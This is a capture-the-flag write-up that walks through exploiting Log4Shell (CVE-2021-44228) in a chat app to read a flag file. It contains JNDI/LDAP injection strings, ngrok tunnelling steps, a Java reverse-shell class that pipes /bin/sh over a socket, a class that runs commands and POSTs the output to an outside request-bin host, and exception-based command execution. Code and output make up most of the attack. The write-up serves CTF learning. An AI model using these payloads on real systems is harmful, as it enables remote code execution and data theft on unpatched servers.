# Log for Jodie (Log4Shell CVE-2021-44228)

Hi there!
Here is how I've solved the "Log for Jodie" challenge in LNC CTF 2022.

# WARNING
This writeup is for EDUCATIONAL PURPOSES only. I do not bear any responsibility if you face any legal consequences arising from the usage of this PoC.

## Challenge description

I found a chatroom for coffee lovers. Right now it's going strong but it would be better with more people! So tell your friends about it now! Oh, btw did you hear? Minecraft got hacked.
`nc c2.lagncrash.com 8003`

## Solution & step-by-step walkthrough
This challenge seems to be using Log4Shell, an exploit for Apache Log4J that was released in late 2021.  
https://en.wikipedia.org/wiki/Log4Shell  
It allows one to RCE into other servers just by using JNDI paired with LDAP. 

Knowledge of Java (and Python) is useful, although not strictly required.

Firstly, let us netcat into the server provided.
![Screenshot from 2022-03-25 15-00-11](https://user-images.githubusercontent.com/58442255/160070697-9cb70585-3270-4e1b-bbae-2490d89bfc9d.png)  
The server has spawned a link for us to connect. Let us connect to that as well.
![Screenshot from 2022-03-25 15-02-05](https://user-images.githubusercontent.com/58442255/160070820-4a6a2ca1-1983-46b3-bd62-fff3746e865c.png)  
Create a nickname and start messaging.

Let's test if the application is vulnerable. You can use any Log4J testing tool on the Internet to test.  
I found this one: https://log4shell.tools/  
Here's a screenshot:
![Screenshot from 2022-03-25 14-59-12](https://user-images.githubusercontent.com/58442255/160070457-918b9ed3-be83-4572-8e96-2cdcccc5892a.png)
Let's enter the JNDI LDAP string into the chat app:
![Screenshot from 2022-03-25 15-07-12](https://user-images.githubusercontent.com/58442255/160071615-8d93a4bd-7d0e-465e-805f-f34beb1c3be6.png)
The server is <b>vulnerable.</b>

Now that we know that the server is vulnerable, how do we RCE into it and get the flag?   
A quick search returns several Log4Shell PoCs, which I used this one: https://github.com/kozmer/log4j-shell-poc

Run:  

```sh
pip install -r requirements.txt
```

Do note that you have to download Oracle JDK at https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html. The download is under the  Java SE Development Kit 8u20 section, can use CTRL+F for that.  
You need an Oracle account for this. If you do not want to reveal your email address, you can use Firefox Relay (https://relay.firefox.com)  
Once you've downloaded the JDK zip, unzip it into the Log4J exploit folder like so:
![Screenshot from 2022-03-25 16-41-53](https://user-images.githubusercontent.com/58442255/160085859-fbf994fa-f92c-4cfc-8a5a-8b03b6b209db.png)


And then run these 2 simultaneously in different sessions:
`nc -lvnp 9001` and `python3 poc.py --userip localhost --webport 8000 --lport 9001`

![Screenshot from 2022-03-25 16-59-03](https://user-images.githubusercontent.com/58442255/160088969-1bd90197-a342-4a6e-8329-e31ed4cf3edb.png)


From here, we can see that the PoC is doing input/output from `localhost`. Unfortunately, `localhost` is not available on the Internet, hence the remote server cannot access the exploit.




A quick search online on exposing localhost to the Internet returns this Stack Overflow post: https://stackoverflow.com/questions/5108483/access-localhost-from-the-internet. This explains how to setup a tunnel for localhost ports.  
Since we're doing it from localhost and a local tunnel, **there is no need to setup a dedicated web server**.  

Out of the 3 services listed, only `ngrok` worked for me. Head to https://ngrok.com/ and create an account (same thing as above, you can use [Firefox Relay](https://relay.firefox.com) if you don't want to reveal your email) 

![Screenshot from 2022-03-25 16-54-35](https://user-images.githubusercontent.com/58442255/160088584-fede8779-1458-4dd6-803b-f2fcf7aa6bf3.png)

(if `ngrok` does not work try `./ngrok` from the directory that you unzipped the file)
Follow Steps 1 and 2. 
For step 3, we need to specify the ports. The web server where exploit class is located is at port 8000, while JNDI/LDAP server is at 1389. For the JNDI/LDAP server, after some testing, I found that we cannot use HTTP. We need to use TCP.  

To open multiple ports at once, you can do this:
From: https://stackoverflow.com/questions/25522360/ngrok-configure-multiple-port-in-same-domain  
Edit `~/.ngrok2/ngrok.yml` and put:
```
authtoken: <YOUR AUTH TOKEN HERE>
tunnels:
  first:
    addr: 1389
    proto: tcp
  second:
    addr: 8000
    proto: http
```
Type `./ngrok start --all ` to create both TCP and HTTP servers.
![Screenshot from 2022-03-25 17-17-29](https://user-images.githubusercontent.com/58442255/160091925-112d5210-4298-4aac-b2ed-395ea890ed73.png)

Once we have that settled, we can replace the URL in the JNDI/LDAP string from `${jndi:ldap://localhost:1389/a}` to `${jndi:ldap://<TCP ADDRESS HERE>/a}`

e.g.
`${jndi:ldap://4.tcp.ngrok.io:15199/a}`

When we paste that in, head to the Python poc.py and you will see something like
```
Send LDAP reference result for a redirecting to http://localhost:8000/Exploit.class
```

The localhost servers are already ported, but as you can see, the chat application is still being redirected to localhost.
Upon inspection of `poc.py`, we see that this line is responsible:

 
   `  url = "http://{}:{}/#Exploit".format(userip, lport)`  
So we can change that to our Web server url (the one running 8000 on local host.)
 
    ` url ="http://{}/#Exploit".format("<WEB SERVER URL HERE>")`

Upon further inspection,  we also realise that the Java exploit program is enclosed in multiline quotes `"""` as `program`
We can modify this to our liking. 
Original code (you should get this from the GitHub PoC):
```python
program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
public class Exploit {
    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (userip, lport)
```

When we type in the JNDI/LDAP uri into the chat app, we get an exception.  
![Screenshot from 2022-03-25 19-52-53](https://user-images.githubusercontent.com/58442255/160116092-7c0571f1-15ce-4f4e-b6a1-e6482c57fafc.png)

 
<details>
  <summary>Java HTTP connection code (does not work on remote coffee chat app) (not very important)</summary>
I have tested with Java code uploading HTTP GET and POST requests using the Java Standard Library, and it turns out we cannot connect to the Internet from Java (the machine is buggy? 🤔), so we cannot send information through GET or POST requests.  
Here's my code if you'd like to take a look: 
  
```  
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.StringJoiner;


public class Exploit {
    public Exploit() throws Exception {
        URL url = new URL("https://enypztvgk53ep.x.pipedream.net/");
        HttpURLConnection con = (HttpURLConnection)url.openConnection();

        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "application/json; utf-8");
        con.setRequestProperty("Accept", "application/json");
        con.setDoOutput(true);

        Process p = Runtime.getRuntime().exec("ls");
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        StringBuilder line2 = new StringBuilder();

        while ((line = br.readLine()) != null) {
            line2.append(line);
            line2.append(",");
        }
        Map<String,String> arguments = new HashMap<>();
        arguments.put("username", "root");
        arguments.put("list", line2.toString()); 
        StringJoiner sj = new StringJoiner("&");
        for(Map.Entry<String,String> entry : arguments.entrySet())
            sj.add(URLEncoder.encode(entry.getKey(), "UTF-8") + "="
                    + URLEncoder.encode(entry.getValue(), "UTF-8"));
        byte[] out = sj.toString().getBytes(StandardCharsets.UTF_8);
        int length = out.length;

        con.setFixedLengthStreamingMode(length);
        con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        con.connect();
        try(OutputStream os = con.getOutputStream()) {
            os.write(out);
            System.out.println(con.getResponseCode());
        }
}
  
```  
This causes:
  
  ```
  Exception in thread "main" java.lang.ExceptionInInitializerError
...........
Caused by: java.security.ProviderException: Could not initialize NSS
	......
Caused by: java.io.FileNotFoundException: /usr/lib/libnss3.so
	at sun.security.pkcs11.Secmod.initialize(Secmod.java:193)
	at sun.security.pkcs11.SunPKCS11.<init>(SunPKCS11.java:218)
	... 78 more
  ```
  Clearly the server does not support sending the request.


</details>
However, a very detailed stack trace is printed. We can throw an exception to get output from commands.  
Here is my final crafted exploit program:  
  
**Note:** We must disconnect the python program and connect again (Ctrl+c)
  (the one started with  `python3 poc.py --userip localhost --webport 8000 --lport 9001` )
  
```python
  program = """

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.StringJoiner;


public class Exploit {
    public Exploit() throws Exception {

        Process p = Runtime.getRuntime().exec("ls");
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        StringBuilder line2 = new StringBuilder();

        while ((line = br.readLine()) != null) {
            line2.append(line);
            line2.append(",");
        }

        throw new Exception(line2.toString());
    }}
"""
```
  
This throws an exception with the output from `ls`.
  
We get this exception:

```java
  java.lang.Exception: bin,dev,etc,home,lib,media,mnt,proc,root,run,sbin,srv,sys,task,tmp,usr,var,]; remaining name 'a'
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1120)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
.................................lines truncated.....................

```
  
  We can see that there is a directory named `task`, which seems like a good place for the flag to be hidden(task is not a default Linux directory)
  
  ```python
  program = """

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.StringJoiner;


public class Exploit {
    public Exploit() throws Exception {

        Process p = Runtime.getRuntime().exec("ls task");
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        StringBuilder line2 = new StringBuilder();

        while ((line = br.readLine()) != null) {
            line2.append(line);
            line2.append(",");
        }

        throw new Exception(line2.toString());
    }}
"""
```
  
  
  Again:
  **Note:** We must disconnect the python program and connect again (Ctrl+c)
  (the one started with  `python3 poc.py --userip localhost --webport 8000 --lport 9001` )
 
  We see this exception
  ```java
  Exception: chall.jar,flag.txt,]; remaining name 'a'
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1120)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:
  .........
  ```
  There's a flag.txt inside.
  
  Let's change 
 `Process p = Runtime.getRuntime().exec("ls task");`

  to
  `Process p = Runtime.getRuntime().exec("cat task/flag.txt");`
  
   Again:
  **Note:** We must disconnect the python program and connect again (Ctrl+c)
  (the one started with  `python3 poc.py --userip localhost --webport 8000 --lport 9001` )
  
  
  We got the flag!
  
  ```
  Exception: LNC2022{b94ec2015978e809b02a6a011970ada8},]; remaining name 'a'
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1120)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)
	at org.apache.logging.log4j.core.
  ```
  
  Flag:
  ```
   LNC2022{b94ec2015978e809b02a6a011970ada8}
  ```
